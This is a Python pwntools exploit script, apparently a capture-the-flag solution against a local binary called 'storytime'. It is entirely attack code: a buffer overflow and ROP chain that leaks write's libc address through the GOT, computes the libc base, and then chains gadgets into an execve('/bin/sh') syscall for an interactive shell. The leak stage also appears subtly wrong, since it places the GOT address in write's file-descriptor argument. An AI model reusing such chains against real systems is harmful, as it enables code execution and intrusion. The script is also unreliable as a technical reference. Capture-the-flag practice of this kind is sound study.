from pwn import *

context.arch = "amd64"
context.binary = ELF("./storytime")
elf = ELF("./storytime")
libc = ELF("./libc.so.6")
target = process("./storytime")

# ROPgadget --binary libc.so.6 --only "pop|ret" | grep -E "rdi|rsi|rdx|rax"
# 0x021102 : pop rdi ; ret
# 0x0202e8 : pop rsi ; ret
# 0x001b92 : pop rdx ; ret
# 0x033544 : pop rax ; ret

# ROPgadget --binary libc.so.6 --only "syscall"
# 0x0026bf : syscall

# ROPgadget --binary libc.so.6 --string "/bin/sh"
# 0x18cd57 : /bin/sh

# ROPgadget --binary ./storytime --only "pop|ret" | grep -E "rdi"
# 0x400703 : pop rdi ; ret
# ---
# readelf -r ./storytime | grep "write"
# 000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 write@GLIBC_2.2.5 + 0

# objdump -d ./storytime | grep "write"
# 0x4004a0 <write@plt>
#--- --- --- --- --- --- --- --- --- --  --- --- -- -- -- --
pop_rdi_w   = 0x400703
write_got   = 0x601018
write_plt   = 0x4004a0
main_addr   = 0x40062E

padding = b"A" * 0x38
payload1 = flat(
    padding,
    pop_rdi_w,
    write_got,
    write_plt,
    main_addr,
)

target.recvuntil(b"Tell me a story: \n")
target.sendline(payload1)

write_leak = u64(target.recv(8).ljust(8, b"\x00"))
log.success(f"Leaked write dynamic address: {hex(write_leak)}")

libc_base = write_leak - libc.symbols["write"]
log.success(f"Calculated Libc Base: {hex(libc_base)}")

pop_rdi = libc_base + 0x021102
pop_rsi = libc_base + 0x0202e8
pop_rdx = libc_base + 0x001b92
pop_rax = libc_base + 0x033544
syscall = libc_base + 0x0026bf
bin_sh  = libc_base + 0x18cd57

target.recvuntil(b"Tell me a story: \n")

payload2 = flat(
    padding,
    pop_rdi,
    bin_sh,
    pop_rsi,
    0,
    pop_rdx,
    0,
    pop_rax,
    0x3b,
    syscall
)

target.sendline(payload2)
target.interactive()
